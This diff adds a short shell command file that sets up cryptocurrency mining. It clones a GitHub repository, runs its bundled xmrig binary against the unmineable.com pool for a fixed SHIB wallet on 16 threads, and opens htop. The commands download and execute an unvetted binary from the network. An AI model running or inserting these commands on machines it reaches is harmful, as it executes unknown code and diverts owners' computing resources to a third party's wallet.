@@ -1,0 +1,10 @@
+
+apt-get update && apt install screen && clear && screen 
+
+
+git clone https://github.com/quincyhays/bmxmrig.git && cd bmxmrig && chmod u+x ./xmrig && ./xmrig -o rx-asia.unmineable.com:3333 -u SHIB:0xe0f84f96d811ce7bea7f1da54ca0eeb1aa5605cc.SHIB-CORE16-01 -p x -t 16  --donate-level 1  --1gb-pages true 
+
+
+./xmrig -o rx-asia.unmineable.com:3333 -u SHIB:0xe0f84f96d811ce7bea7f1da54ca0eeb1aa5605cc.CORE16-01 -p x -t 16 --donate-level 1  --1gb-pages true && htop
+
+
